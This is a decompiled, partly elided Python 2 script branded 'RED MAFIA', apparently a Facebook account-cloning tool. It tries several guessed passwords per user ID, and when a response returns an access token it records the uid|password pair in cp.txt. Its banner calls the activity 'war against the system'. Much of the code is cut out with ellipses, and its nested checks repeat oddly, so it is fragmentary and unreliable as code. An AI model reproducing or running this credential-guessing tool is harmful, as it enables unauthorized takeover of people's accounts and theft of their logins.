...
# Embedded file name: /sdcard/Download/fcpro.py
# Compiled at: 2022-03-14 19:12:08
try:
...
def ban():
	...
	jalan ('\033[1;92m                 RED \033[1;91mMAFIA------------------')
	jalan ('\033[1;97m              Cloning Is \033[1;94mNot A Crime   ')
	jalan ('\033[1;96mIts Just War \033[1;93mAgainst The System ')
...
def main():
    os.system('clear')
    ban()
    print '\t\x1b[93;2mRED-MAFIA\x1b[0m'
    print ''
...
def log_sel():
    ...
    if sel == '':
        ...
        import os
        try:
            os.system('git clone https://github.com/Red-Mafia/A1.git')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in data.text and 'EAAA' in data.text:
                ...
                print ' \x1b[1;33m[RK-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                if 'access_token' in data.text and 'EAAA' in data.text:
                    ...
                    print ' \x1b[1;33m[RK-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        ...
                        print ' \x1b[1;33m[RK-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('cp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            ...
                            print ' \x1b[1;33m[RK-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('cp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                ...
                                print ' \x1b[1;33m[RK-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('cp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    ...
                                    print ' \x1b[1;33m[RK-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        ...
                                        print ' \x1b[1;33m[RK-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            ...
                                            print ' \x1b[1;33m[RK-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass8 + '\n')
                                            cp.close()
...
if __name__ == '__main__':
    main()
# okay decompiling /sdcard/Download/fcpro.pyc
